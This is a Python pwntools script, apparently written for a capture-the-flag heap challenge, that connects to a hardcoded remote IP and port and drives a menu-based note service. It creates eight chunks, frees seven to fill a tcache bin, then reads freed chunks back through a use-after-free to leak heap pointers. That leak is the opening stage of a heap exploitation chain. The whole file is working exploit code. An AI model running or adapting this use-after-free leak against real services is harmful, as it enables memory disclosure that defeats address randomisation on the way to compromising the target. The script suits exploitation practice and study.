import re
from pwn import *

context.arch = "amd64"
context.log_level = "info"

HOST, PORT = "144.79.188.39", 40838

def find_leak():
    io = remote(HOST, PORT, timeout=10)
    def menu(c): io.sendlineafter(b"> ", str(c).encode())
    def create(idx, size, data):
        menu(1)
        io.sendlineafter(b"Index: ", str(idx).encode())
        io.sendlineafter(b"Size: ", str(size).encode())
        io.sendafter(b"Data: ", data)
    def readn(idx, n):
        menu(2)
        io.sendlineafter(b"Index: ", str(idx).encode())
        io.recvuntil(b"Data: ")
        return io.recvn(n)
    def delete(idx):
        menu(4)
        io.sendlineafter(b"Index: ", str(idx).encode())

    # Create 8 chunks
    for i in range(8):
        create(i, 0x80, f"{i:02x}".encode() * 0x40)
    
    # Delete 0..6 (fills tcache 0x90)
    for i in range(7):
        delete(i)
        
    # Read chunk 6 (head of tcache)
    leak6 = readn(6, 0x80)
    print("Chunk 6 tcache head leak:", leak6[:16].hex())
    
    # Read chunk 0 (tail of tcache)
    leak0 = readn(0, 0x80)
    print("Chunk 0 tcache tail leak:", leak0[:16].hex())
    
    io.close()

if __name__ == "__main__":
    find_leak()
